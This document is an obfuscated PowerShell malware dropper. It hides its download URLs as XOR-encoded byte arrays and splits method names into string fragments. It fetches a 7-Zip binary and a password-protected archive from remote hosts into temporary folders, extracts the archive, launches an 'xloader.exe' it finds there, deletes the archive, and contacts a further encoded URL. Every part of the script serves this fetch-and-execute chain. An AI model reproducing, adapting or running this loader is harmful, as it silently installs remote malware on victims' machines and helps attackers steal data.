$n2492='Op'+'en';$n342c='Se'+'nd';$n95d5='Re'+'sponseBody';$n3524='WriteAl'+'lBytes';$n22bd={param($u);$wc.$n2492('GET',$u,0);$wc.$n342c();$wc.$n95d5};
Start-Sleep -Seconds 20;
$pw=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFzc3dvcmQxMjM0'));
$u575ff=-join(@(75,87,87,83,25,12,12,70,77,87,70,81,14,64,76,71,70,14,64,71,77,13,74,77,69,76,12,20,89)|%{[char]($_-bxor35)});$uac86a=-join(@(113,109,109,105,35,54,54,124,119,109,124,107,52,122,118,125,124,52,122,125,119,55,112,119,127,118,54,124,43,46,124,125,43,44,47,47,46,33,32,47,123,41,33,32,120,32,47,127,41,124,45,45,41,123,125,123,125,127,44,43,125,127,120,44,42,120,44,42,44,44,46,33,33,122,40,47,44,42,42,46,127,127,46,45,122,122,42,33,46,47,33)|%{[char]($_-bxor25)});$td=[IO.Path]::Combine([IO.Path]::GetTempPath(),[IO.Path]::GetRandomFileName())
[IO.Directory]::CreateDirectory($td)|Out-Null
$z=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.exe')
$a=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName()+'.7z')
$wc=New-Object -ComObject ('WinHttp.WinHttpRequest'+'.5.1')
$ok=0
for($i=0;$i -lt 3 -and !$ok;$i++){
  try{
    if(![IO.File]::Exists($z)){[IO.File]::WriteAllBytes($z,(& $n22bd $u575ff))}
    [IO.File]::WriteAllBytes($a,(& $n22bd $uac86a))
    if([IO.File]::Exists($a)){$ok=1}else{Start-Sleep 2}
  }catch{Start-Sleep 2}
}
if(![IO.File]::Exists($a)){exit}
$nd=[IO.Path]::Combine($td,[IO.Path]::GetRandomFileName())
[IO.Directory]::CreateDirectory($nd)|Out-Null
$xa=@('x','-y')
if($pw){$xa+='-p'+$pw};
$xa+='-o'+$nd
$xa+=$a
if([IO.File]::Exists($z)){& $z @xa|Out-Null}else{
  try{Add-Type -A System.IO.Compression.FileSystem;[IO.Compression.ZipFile]::ExtractToDirectory($a,$nd)}catch{}
}
$fp=[IO.Directory]::GetFiles($nd,'xloader.exe','AllDirectories')|Select-Object -First 1
if($fp){Start-Process -FilePath $fp}
try{Start-Sleep 3;[IO.File]::Delete($a)}catch{}
$ufd0be=-join(@(24,4,4,0,74,95,95,21,30,4,21,2,93,19,31,20,21,93,19,20,30,94,25,30,22,31,95,0,95,21,66,71,21,20,66,69,70,70,71,72,73,70,18,64,72,73,17,73,70,22,64,21,68,68,64,18,20,18,20,22,69,66,20,22,17,69,67,17,69,67,69,69,71,72,72,19,65,70,69,67,67,71,22,22,71,68,19,19,67,72,71,70,72)|%{[char]($_-bxor112)});$ne73f='DownloadStr'+'ing'
try{[void]$wc.$ne73f($ufd0be)}catch{}